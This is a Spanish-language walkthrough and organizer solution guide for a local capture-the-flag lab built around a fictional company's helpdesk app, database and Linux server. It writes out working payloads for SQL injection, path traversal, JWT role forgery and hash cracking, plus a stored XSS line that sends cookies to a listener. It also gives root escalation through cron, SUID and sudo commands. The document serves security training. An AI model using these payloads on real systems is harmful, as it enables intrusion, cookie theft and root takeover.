# Goal Path — Resolución Completa del Laboratorio

Esta es la guía de **resolución y exploración paso a paso** del Sabana Corp Network CTF Lab. Contiene el detalle completo de cada vulnerabilidad, cómo explotarla, y la cadena de explotación end-to-end desde el acceso inicial hasta root en el servidor Linux. 

Use este archivo para:
- Entender en detalle cada reto y por qué funciona
- Seguir el walthrough de **participante** (section "Los Retos") o de **organizador** (section "Soluciones")
- Validar que cada paso entrega la información necesaria para el siguiente

---

## Los Retos

### Reto 1 — Web Application (`services/webapp/`)

**Narrativa:** Sabana Corp tiene un sistema interno de tickets de soporte (helpdesk). El participante llega como atacante externo con solo la URL de la aplicación.

La aplicación tiene tres perfiles de usuario: Visitante (sin sesión), Empleado, y Personal de TI. La cadena de explotación avanza escalando privilegios dentro de la propia app antes de salir hacia los otros servicios.

---

#### 1.1 — Credenciales expuestas en el código fuente

**Vulnerabilidad:** el código fuente HTML de `/login` contiene un comentario con credenciales de prueba que el equipo de desarrollo olvidó eliminar antes de pasar a producción.

**Cómo funciona:** el participante abre el código fuente de la página de login (`Ctrl+U` o `view-source:`) y encuentra:
```html
<!-- TODO(dev): quitar antes de pasar a producción — credenciales de prueba para QA
    usuario: jperez
    password: Bienvenido123 -->
```

**Entrega:** sesión válida como empleado (`jperez`, rol `employee`).

---

#### 1.2 — SQL Injection en el buscador de tickets ★ `objetivo_final` no aplica

**Vulnerabilidad:** el endpoint de búsqueda de tickets (`/search?q=...`) construye la consulta SQL concatenando directamente el input del usuario sin prepared statements ni sanitización.

**Cómo funciona:** el participante inyecta SQL en el parámetro `q`. Los errores de MySQL se muestran en pantalla (error-based SQLi). Con una inyección UNION puede leer datos fuera de su alcance:

```sql
' UNION SELECT id,username,role,email FROM users -- -
```

Esto expone la tabla de usuarios, incluyendo el ID del empleado de TI (`it_soporte`, `id=3`).

**Entrega:** ID del usuario con rol `it` (necesario para el IDOR del paso siguiente).

---

#### 1.3 — IDOR en perfiles de usuario

**Vulnerabilidad:** el endpoint `/profile?id=X` carga el perfil del ID solicitado sin verificar que pertenezca al usuario autenticado.

**Cómo funciona:** el participante cambia el parámetro `id` de su propio ID al ID descubierto en el paso anterior:
```
/profile?id=3
```
El perfil de `it_soporte` muestra una sección "Herramientas internas de TI" con un enlace al panel interno. Al hacer clic, el servidor responde con `403` y el mensaje:
```
Acceso denegado a /api/internal/admin/database: se requiere rol it o admin.
```

**Entrega:** ruta exacta del endpoint interno protegido: `/api/internal/admin/database`.

---

#### 1.4 — LFI (Local File Inclusion) en adjuntos de tickets 📄 `objetivo_final.txt` → palabra: **"trabaja"**

**Vulnerabilidad:** el endpoint `/attachment?file=<nombre>` sirve archivos del directorio de uploads usando `readfile()` sin validar ni normalizar el parámetro. Permite path traversal para leer cualquier archivo accesible por el proceso de Apache. Además, si `file` apunta a un directorio en vez de a un archivo, el endpoint **lista su contenido** en lugar de fallar — un oráculo deliberado para no depender de adivinar rutas a ciegas.

**Truco para descubrir rutas — listado de directorios:** el directorio base de adjuntos es `/var/www/html/uploads/`. Probar `file` con solo puntos y barras, sin nombre de archivo, lista lo que hay en ese nivel:
```
/attachment?file=.        → lista /var/www/html/uploads (el directorio de adjuntos)
/attachment?file=../      → lista /var/www/html         (un nivel arriba)
/attachment?file=../../   → lista /var/www              (dos niveles arriba)
```
Cada respuesta muestra las carpetas y archivos de ese nivel, y si existe carpeta anterior (`..`). Subiendo nivel por nivel con este truco aparece `flag_lfi.txt` y `objetivo_final.txt` listados dentro de `/var/www` — sin necesidad de conocer sus nombres de antemano. Desde ahí ya se puede pedir el archivo directamente:
```
/attachment?file=../../flag_lfi.txt        → FLAG_WEBAPP_LFI
/attachment?file=../../objetivo_final.txt  → "trabaja"
```

**Sobre `/etc/passwd`:** la base de adjuntos, `/var/www/html/uploads`, está a 4 niveles de la raíz del filesystem (`/`, `var`, `www`, `html`, `uploads`). `file=../../etc/passwd` (2 niveles, la ruta que se prueba de forma intuitiva) NO llega a la raíz real — resuelve a `/var/www/etc/passwd`, un archivo de aspecto realista colocado ahí a propósito para que esa ruta "intuitiva" funcione con contenido creíble en vez de dar 404. El `/etc/passwd` real del contenedor sí es alcanzable subiendo dos niveles más (4 en total):
```
/attachment?file=../../etc/passwd      → /var/www/etc/passwd (señuelo realista)
/attachment?file=../../../../etc/passwd   → /etc/passwd real del contenedor
```

Los archivos de la flag y del objetivo final están colocados en `/var/www/` a propósito: fuera del DocumentRoot de Apache, por lo que no son descargables vía HTTP directamente, pero sí mediante el path traversal.

**Entrega:** `FLAG_WEBAPP_LFI` + primera palabra del meta-reto (`trabaja`).

---

#### 1.5 — JWT inseguro → endpoint interno → credenciales de la BD 📄 `objetivo_final.txt` → palabra: **"duro"**

**Vulnerabilidad:** el backend decodifica el JWT de sesión (`jwt_decode_unverified()` en `services/webapp/src/jwt.php`, usado por `current_user()` en `services/webapp/src/auth.php`) sin recalcular ni comparar la firma HMAC. Cualquier participante puede tomar su propio JWT, modificar el claim `role` en el payload, reconstruir el token con cualquier firma (incluso una inventada), y el servidor lo aceptará igual. El control de acceso de `/api/internal/admin/database` (`services/webapp/src/api/internal/admin/database.php`) solo revisa ese claim.

**Paso a paso:**

1. **Iniciar sesión** en `http://localhost:8080/login` con `jperez` / `Bienvenido123` (credencial del Reto 1.1). El login coloca una cookie llamada exactamente `session` — es un JWT (`xxxxx.yyyyy.zzzzz`).

2. **Obtener el valor de la cookie `session`.** Dos formas:
   - **Navegador:** DevTools (`F12`) → pestaña *Application* (Chrome/Edge) o *Almacenamiento* (Firefox) → *Cookies* → `http://localhost:8080` → copiar el valor de la cookie `session`.
   - **curl** (guardando la sesión en un archivo para reutilizarla):
     ```bash
     curl -s -c cookies.txt -X POST http://localhost:8080/login \
       -d "username=jperez&password=Bienvenido123" -o /dev/null
     JWT=$(grep session cookies.txt | awk '{print $NF}')
     echo "$JWT"
     ```

3. **Decodificar el JWT.** El token tiene 3 partes separadas por `.`: `header.payload.firma`. Dos formas de decodificarlo:
   - **jwt.io** (https://jwt.io): pegar el token completo en el campo "Encoded". El panel derecho muestra el header y el payload decodificados en JSON (no hace falta conocer el secreto para *leerlo* — solo para que jwt.io marque la firma como "verified", algo que aquí es irrelevante).
   - **Manual con `base64`** (sin depender de ninguna web):
     ```bash
     echo "$JWT" | cut -d'.' -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
     # → {"sub":2,"username":"jperez","role":"employee","iat":...}
     ```
   - **`jwt_tool`** (https://github.com/ticarpi/jwt_tool), si está instalado:
     ```bash
     python3 jwt_tool.py "$JWT"
     ```

4. **Modificar el claim `role`**: cambiar `"role":"employee"` por `"role":"it"` (o `"admin"`) en el JSON del payload.

5. **Re-codificar el payload modificado a base64url** (sin padding `=`) y reemplazar solo la segunda parte del token. La firma (tercera parte) puede quedar igual o ser cualquier string — el servidor nunca la recalcula:
   ```bash
   HEADER=$(echo "$JWT" | cut -d'.' -f1)
   FIRMA=$(echo "$JWT" | cut -d'.' -f3)
   NUEVO_PAYLOAD=$(echo -n '{"sub":2,"username":"jperez","role":"it","iat":1234567890}' \
     | base64 | tr '+/' '-_' | tr -d '=')
   JWT_MODIFICADO="${HEADER}.${NUEVO_PAYLOAD}.${FIRMA}"
   ```
   Con `jwt_tool`, el mismo paso se hace con `python3 jwt_tool.py "$JWT" -T` (modo interactivo de tampering) en vez de a mano.

6. **Usar el JWT modificado** en la cookie `session`, ya sea reemplazándola en el navegador (DevTools → Cookies → editar el valor) o directamente con curl:
   ```bash
   curl http://localhost:8080/api/internal/admin/database \
     -H "Cookie: session=${JWT_MODIFICADO}"
   ```

El endpoint responde con:
```json
{
  "db_host": "database",
  "db_name": "sabana_helpdesk",
  "db_user": "helpdesk_app",
  "db_password": "<contraseña real>",
  "objetivo_final": "duro"
}
```

**Entrega:** credenciales de la Base de Datos para el Reto 2 + segunda palabra del meta-reto (`duro`).

---

#### 1.6 — Stored XSS → cookie del admin → flag

**Vulnerabilidad:** los comentarios de tickets se guardan y renderizan sin sanitizar (`echo $c['body']` sin `htmlspecialchars()` en `services/webapp/src/ticket.php`). La cookie de sesión del administrador no tiene flag `HttpOnly` (`services/webapp/src/auth.php`). No hay Content Security Policy. Un bot con navegador real (`services/xss-bot/bot.js`, Chromium headless vía Playwright) visita los tickets periódicamente.

**Por qué hace falta un servidor propio:** el payload no puede simplemente "mostrar" la cookie — tiene que sacarla del navegador del bot hacia algún sitio que el participante controle y pueda leer. Ese "sitio" es un servidor HTTP mínimo que el participante levanta él mismo, cuyo único trabajo es quedar registrado en sus logs cuando reciba la petición con la cookie en la query string.

**Punto crítico de red — `localhost` NO sirve:** el bot que ejecuta el payload corre en un contenedor Docker aparte (`xss-bot`), en la misma red del laboratorio (`sabana-lab`, ver `docker-compose.yml`), no en la máquina del participante. Si el payload apunta a `http://localhost:8888/...` o `http://127.0.0.1:8888/...`, esa dirección se resuelve **dentro del contenedor del bot**, no en la máquina del participante — el listener nunca recibe nada. Hace falta una dirección que el contenedor `xss-bot` pueda alcanzar de verdad:

- **Si el laboratorio corre en tu propia máquina** (caso típico de `docker compose up --build` local, como en "Arranque rápido"): tu máquina *es* el host Docker, y los contenedores pueden alcanzarla a través de la puerta de enlace de la red bridge del laboratorio, que es **`172.28.0.1`** (fija, ver `docker-compose.yml` → `networks.sabana-lab.ipam`). Usa esa IP en el payload, no `localhost`.
- **Si el laboratorio corre en un servidor remoto** (evento centralizado): el listener debe correr en una máquina alcanzable *desde ese servidor* — por ejemplo tu propia máquina expuesta con `ngrok`/`localhost.run`, o cualquier host con IP pública que controles. `localhost`/`127.0.0.1` sigue sin servir por la misma razón.

**Cómo funciona, paso a paso:**

1. **Levantar el listener** en tu máquina (la que ejecuta `docker compose up`), en el puerto que prefieras (aquí `8888`):
   ```bash
   python3 -m http.server 8888
   # alternativa equivalente:
   # nc -lvnp 8888
   ```
   `python3 -m http.server` responderá 404 a la petición del bot — no importa, lo único que interesa es la línea que registra en su log con la cookie robada.

2. **Publicar el payload** como comentario en cualquier ticket (`/ticket?id=<id>`), usando la IP de la puerta de enlace (no `localhost`):
   ```html
   <script>fetch('http://172.28.0.1:8888/?c='+document.cookie)</script>
   ```

3. Al guardar el comentario, `ticket.php` encola el ticket en `bot_visit_queue`. El bot (`bot.js`) hace polling cada `BOT_VISIT_INTERVAL_SECONDS` (30s por defecto), obtiene una cookie de admin fresca vía `/bot_login.php`, y navega a `/ticket?id=<id>` con Chromium real — ahí es donde el `<script>` del comentario se ejecuta.

4. El `fetch()` sale desde el navegador del bot hacia tu listener. En la terminal del `python3 -m http.server` debe aparecer algo como:
   ```
   172.28.0.40 - - [...] "GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<firma> HTTP/1.1" 404 -
   ```
   (`172.28.0.40` es la IP fija del contenedor `xss-bot` en `docker-compose.yml` — confirma que la petición vino del bot, no de ti).

5. La cookie exfiltrada es un JWT. Decodificar su payload (igual que en el Reto 1.5 — `base64 -d` de la segunda parte, o jwt.io) revela el claim `flag`:
   ```json
   {"sub":1,"username":"admin","role":"admin","flag":"SABANA{...}","iat":...}
   ```

**Entrega:** `FLAG_WEBAPP_XSS`.

---

### Reto 2 — Base de Datos (`services/database/`)

**Narrativa:** con las credenciales obtenidas del endpoint interno, el participante se conecta directamente al servidor MariaDB (puerto 3306 expuesto) y encuentra contraseñas almacenadas con hash débil.

---

#### 2.1 — Acceso directo a la base de datos

El participante usa las credenciales obtenidas en el Reto 1.5:
```bash
mysql -h localhost -P 3306 -u helpdesk_app -p
# introducir DB_APP_PASSWORD cuando se solicite

# Desde WSL me sirvio 
mysql -h localhost -P 3306 --protocol=TCP -u helpdesk_app -p
```

#### 2.2 — Hashes MD5 sin salt en la tabla `users`

```sql
USE sabana_helpdesk;
SELECT id, username, role, password_md5 FROM users;
```

Las contraseñas están almacenadas como MD5 puro sin sal. Son vulnerables a ataques de diccionario con `hashcat`:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Los hashes de los empleados (`jperez`, `msilva`, `rgomez`, `lcastro`) se crackean en segundos.

#### 2.3 — Flag en `system_notes`

```sql
SELECT content FROM system_notes;
```

Una de las filas contiene directamente `FLAG_DATABASE`.

**Entrega:** `FLAG_DATABASE` + identificar que la contraseña de `msilva` crackeada es la credencial SSH del Reto 3.

---

### Reto 3 — Linux Server (`services/linux-server/`)

**Narrativa:** una de las contraseñas crackeadas en el Reto 2 pertenece a `msilva`, quien reutiliza la misma contraseña en el servidor Linux de la empresa. El participante entra con bajo privilegio y debe escalar hasta root.

Cadena de escalamiento:

```
msilva (SSH) → jrodriguez (cron job hijacking) → lcastillo (SUID) → root (sudo GTFOBins)
```

---

#### 3.1 — Ingreso SSH como `msilva`

```bash
ssh msilva@localhost -p 2222
# contraseña: la crackeada del hash MD5 de msilva en el Reto 2 (ver Reto 2.2)
```

La contraseña es el valor de la variable de entorno `PIVOT_SSH_PASSWORD` (misma variable inyectada al `webapp`/`database` para el hash de `msilva` y al `linux-server` para su cuenta SSH — ver `docker-compose.yml` y `services/linux-server/entrypoint.sh`). **Para esta instancia de práctica/desarrollo del repositorio**, con los valores por defecto de `.env.example`, la credencial es:

```
usuario:     msilva
contraseña:  princess
```

> Esto es el valor de referencia usado por este repo para desarrollo local (`.env.example` → `PIVOT_SSH_PASSWORD=princess`), no un secreto de un evento real. Para un evento en producción, `.env` debe definir su propio `PIVOT_SSH_PASSWORD` (otra palabra débil de diccionario) y esa credencial nunca debería documentarse en texto plano en este README — se obtiene crackeando el hash MD5 de `msilva` en el Reto 2, tal como está diseñado el pivote.

`msilva` tiene permisos mínimos: solo su propio home, sin sudo, sin acceso a los homes ajenos.

---

#### 3.2 — Escalamiento a `jrodriguez` vía cron job 📄 `objetivo_final.txt` → palabra: **"con"**

**Vulnerabilidad:** un cron job de `jrodriguez` ejecuta `/opt/scripts/sync.sh` cada minuto. El archivo tiene permisos `777` — escribible por cualquier usuario.

**Cómo funciona:**
1. Detectar el cron con `pspy` o leyendo `/etc/cron.d/sync-logs`.
2. Modificar el script para copiar bash con bit SUID a `/tmp/`:
   ```bash
   echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /opt/scripts/sync.sh
   ```
3. Esperar hasta el siguiente minuto.
4. Ejecutar el bash copiado con flag `-p` (preserva el effective UID):
   ```bash
   /tmp/bash -p
   # → shell con effective UID de jrodriguez
   ```
5. Leer el archivo del meta-reto:
   ```bash
   cat /home/jrodriguez/objetivo_final.txt   # → "con"
   ```

**Entrega:** shell como `jrodriguez` + tercera palabra del meta-reto (`con`).

---

#### 3.3 — Escalamiento a `lcastillo` vía binario SUID

**Vulnerabilidad:** `/usr/local/bin/find` es una copia del binario `find` con el bit SUID activado y propietario `lcastillo`. Cuando cualquier usuario lo ejecuta, el proceso corre con el effective UID de `lcastillo`.

**Cómo funciona:**
1. Buscar binarios con SUID:
   ```bash
   find / -perm -4000 2>/dev/null
   # → /usr/local/bin/find
   ```
2. Escalar usando GTFOBins:
   ```bash
   /usr/local/bin/find . -exec /bin/bash -p \; -quit
   # → shell con effective UID de lcastillo (id muestra euid=lcastillo, pero el UID *real* sigue
   #   siendo el del usuario anterior — importante para el paso 3.4)
   ```

**Entrega:** shell con effective UID de `lcastillo`.

> **Nota técnica:** `bash -p` solo evita que bash *descarte* el privilegio (no resetea `euid` a `ruid`
> al arrancar), pero no promueve el UID real. `sudo` decide si te deja ejecutar algo mirando tu UID
> **real**, no el efectivo — así que en este punto `sudo -l` todavía va a fallar ("... may not run sudo
> on ..."), aunque `id` ya muestre `euid=lcastillo`. El paso 3.4 explica cómo terminar de promover el UID.

---

#### 3.4 — Escalamiento a root vía sudo NOPASSWD + GTFOBins

**Vulnerabilidad:** `lcastillo` tiene permiso `sudo NOPASSWD` para `/usr/bin/python3`.

**Cómo funciona:**
1. Promover también el UID *real* a `lcastillo` (no solo el efectivo). En Linux, `setuid()` sin privilegios
   de root solo toca el UID efectivo — hace falta `setresuid()` para arrastrar real/efectivo/saved los tres
   a la vez, algo que sí está permitido porque `lcastillo` ya es el saved-UID heredado del binario SUID:
   ```bash
   python3 -c 'import os,pwd; u=pwd.getpwnam("lcastillo").pw_uid; os.setresuid(u,u,u); os.execl("/bin/bash","bash")'
   id
   # → uid=lcastillo gid=... (ya no hay euid= separado: los tres UID son lcastillo)
   ```
2. Ahora sí, verificar permisos sudo:
   ```bash
   sudo -l
   # → (ALL) NOPASSWD: /usr/bin/python3
   ```
3. Escalar con GTFOBins:
   ```bash
   sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
   # → shell como root
   ```

---

#### 3.5 — Flag final en `/root/secrets.txt` 📄 `objetivo_final.txt` → palabra: **"pasion"**

```bash
cat /root/secrets.txt          # → FLAG_LINUXSERVER_ROOT
cat /root/objetivo_final.txt   # → "pasion"
```

**Entrega:** `FLAG_LINUXSERVER_ROOT` + cuarta palabra del meta-reto (`pasion`).

---

#### 3.6 — Proceso `flag`: credencial expuesta en argumentos de proceso

**Vulnerabilidad:** un proceso llamado `flag` corre en background como `nobody` con `FLAG_LINUXSERVER_PROC` como argumento de línea de comandos. Los argumentos de proceso son visibles para todos los usuarios en Linux.

**Accesible desde:** cualquier nivel (incluso `msilva` sin escalar). Es un reto paralelo, no un escalón de la cadena.

**Cómo funciona:**
```bash
ps aux | grep flag
# → nobody  <PID>  ...  /bin/bash /usr/local/bin/flag SABANA{...}

# Alternativa via /proc:
cat /proc/<PID>/cmdline | tr '\0' '\n'

# Completar el reto eliminando el proceso:
kill <PID>
```

**Entrega:** `FLAG_LINUXSERVER_PROC`.

---

## Soluciones (guía completa para organizadores)

Esta sección documenta el recorrido completo de explotación con comandos exactos. Para uso interno del equipo organizador; no compartir con participantes.

### Fase 1 — Reconocimiento inicial y acceso a la webapp

```bash
# Abrir en el navegador
http://localhost:8080

# Ver código fuente del login — encontrar credenciales
# Ctrl+U en el navegador o:
curl -s http://localhost:8080/login | grep -A3 "TODO"
# → usuario: jperez / password: Bienvenido123
```

### Fase 2 — Iniciar sesión y explotar SQLi

```bash
# Iniciar sesión como jperez en el navegador (http://localhost:8080/login)
# Ir a la búsqueda de tickets (/search) y probar:
# Payload básico:
' OR 1=1 -- -

# UNION para leer usuarios (la tabla tiene 5 columnas: id, subject, status, assigned_to; ajustar):
' UNION SELECT id,username,role,email FROM users -- -

# Con sqlmap:
sqlmap -u "http://localhost:8080/search?q=test" \
  --cookie="session=<JWT_DE_JPEREZ>" \
  --dump -T users -D sabana_helpdesk
```

### Fase 3 — IDOR al perfil de IT

```bash
# Navegador: cambiar el parámetro id al del usuario IT (id=3)
http://localhost:8080/profile?id=3
# → Ver sección "Herramientas internas de TI" y el enlace que da 403
```

### Fase 4 — LFI y objetivo_final (palabra 1)

```bash
# Descubrir la ruta listando directorios (oráculo de listado, ver Reto 1.4):
curl "http://localhost:8080/attachment?file=../../"
# → lista el contenido de /var/www, incluyendo flag_lfi.txt y objetivo_final.txt

# Flag LFI:
curl "http://localhost:8080/attachment?file=../../flag_lfi.txt"

# Palabra 1 del meta-reto:
curl "http://localhost:8080/attachment?file=../../objetivo_final.txt"
# → trabaja

# Bonus: señuelo de /etc/passwd (dos niveles) vs. /etc/passwd real del contenedor (cuatro niveles):
curl "http://localhost:8080/attachment?file=../../etc/passwd"
curl "http://localhost:8080/attachment?file=../../../../etc/passwd"
```

### Fase 5 — JWT bypass y objetivo_final (palabra 2)

```bash
# 1. Obtener el JWT actual de la cookie 'session' (desde las DevTools del navegador o curl)
JWT="<token_de_jperez>"

# 2. Decodificar el payload (segunda parte entre los puntos):
echo "<segunda_parte_del_jwt>" | base64 -d 2>/dev/null
# → {"sub":2,"username":"jperez","role":"employee","iat":...}

# 3. Crear payload modificado:
NUEVO_PAYLOAD=$(echo -n '{"sub":2,"username":"jperez","role":"it","iat":1234567890}' | base64 | tr '+/' '-_' | tr -d '=')

# 4. Reutilizar header y firma del JWT original, solo cambiar el payload:
HEADER=$(echo $JWT | cut -d'.' -f1)
FIRMA=$(echo $JWT | cut -d'.' -f3)
JWT_MODIFICADO="${HEADER}.${NUEVO_PAYLOAD}.${FIRMA}"

# 5. Acceder al endpoint interno:
curl http://localhost:8080/api/internal/admin/database \
  -H "Cookie: session=${JWT_MODIFICADO}"
# → {"db_host":"database","db_name":"sabana_helpdesk",
#    "db_user":"helpdesk_app","db_password":"<PASS>","objetivo_final":"duro"}
```

### Fase 6 — Stored XSS y exfiltración de cookie

```bash
# El bot (contenedor xss-bot) NO ve tu "localhost": levanta el listener en la máquina que corre
# docker compose y usa la puerta de enlace fija de la red del laboratorio (172.28.0.1), no 127.0.0.1.
python3 -m http.server 8888

# Payload en el campo de comentario de cualquier ticket (/ticket?id=<id>):
<script>fetch('http://172.28.0.1:8888/?c='+document.cookie)</script>

# Esperar hasta BOT_VISIT_INTERVAL_SECONDS (30s por defecto) a que xss-bot visite el ticket.
# El listener recibe algo como (172.28.0.40 = IP fija de xss-bot en docker-compose.yml):
# 172.28.0.40 - - [...] "GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<PAYLOAD>.<SIG> HTTP/1.1" 404 -

# Decodificar el payload del JWT recibido:
echo "<PAYLOAD>" | base64 -d
# → {"sub":1,"username":"admin","role":"admin","flag":"SABANA{...}","iat":...}
```

### Fase 7 — Acceso a la base de datos (Reto 2)

```bash
# Conectar con las credenciales obtenidas en la Fase 5:
mysql -h 127.0.0.1 -P 3306 -u helpdesk_app -p
# Password: el valor de db_password del JSON anterior

USE sabana_helpdesk;
SELECT id, username, role, password_md5 FROM users;
SELECT content FROM system_notes;   # → FLAG_DATABASE
```

### Fase 8 — Crackeo de hashes MD5

```bash
# Guardar los hashes en un archivo (uno por línea, formato hashcat -m 0):
cat hashes.txt
# <hash_admin>
# <hash_jperez>
# <hash_it_soporte>
# <hash_msilva>
# <hash_rgomez>
# <hash_lcastro>

# Crackear con hashcat:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Con los valores por defecto de este repo (services/database/init/01-seed.sql.template), crackean 5/6:
#   admin      → qwerty
#   it_soporte → monkey
#   msilva     → princess   (= PIVOT_SSH_PASSWORD, contraseña SSH del Reto 3)
#   rgomez     → Password1
#   lcastro    → iloveyou
# jperez NO crackea con rockyou a propósito: su contraseña (Bienvenido123) ya se entrega directamente
# vía el comentario HTML del Reto 1.1, no depende de hashcat.

# Identificar cuál es la contraseña de msilva → esa es PIVOT_SSH_PASSWORD, la credencial SSH del Reto 3.
```

### Fase 9 — Escalamiento en el servidor Linux (Reto 3)

```bash
# ── Nivel 1: entrar como msilva ──
ssh msilva@localhost -p 2222
# Password: contraseña crackeada de msilva

# ── Reto 3.6 (paralelo, no requiere escalada): ──
ps aux | grep flag
# → nobody  42  ...  /bin/bash /usr/local/bin/flag SABANA{...}
kill 42

# ── Nivel 1→2: cron job hijacking ──
# Detectar el cron:
cat /etc/cron.d/sync-logs
# o: descargar y ejecutar pspy para verlo en tiempo real

# Modificar el script vulnerable:
echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /opt/scripts/sync.sh

# Esperar hasta el siguiente minuto completo y ejecutar:
/tmp/bash -p
# → prompt de jrodriguez

cat /home/jrodriguez/objetivo_final.txt   # → "con"

# ── Nivel 2→3: SUID binary ──
find / -perm -4000 2>/dev/null
# → /usr/local/bin/find  (propiedad de lcastillo, SUID)

/usr/local/bin/find . -exec /bin/bash -p \; -quit
# → prompt de lcastillo

# ── Nivel 3→root: sudo GTFOBins ──
sudo -l
# → (ALL) NOPASSWD: /usr/bin/python3

sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
# → prompt de root (#)

# ── Flag final ──
cat /root/secrets.txt                 # → FLAG_LINUXSERVER_ROOT
cat /root/objetivo_final.txt          # → "pasion"
```

### Resultado final del meta-reto

| Orden | Reto | Ubicación del archivo | Palabra |
|---|---|---|---|
| 1 | 1.4 — LFI | `/var/www/objetivo_final.txt` → `/attachment?file=../../objetivo_final.txt` | trabaja |
| 2 | 1.5 — JWT bypass | Campo `objetivo_final` en `/api/internal/admin/database` | duro |
| 3 | 3.2 — Cron job | `/home/jrodriguez/objetivo_final.txt` | con |
| 4 | 3.5 — Root | `/root/objetivo_final.txt` | pasion |

**Frase completa: `trabaja duro con pasion`**
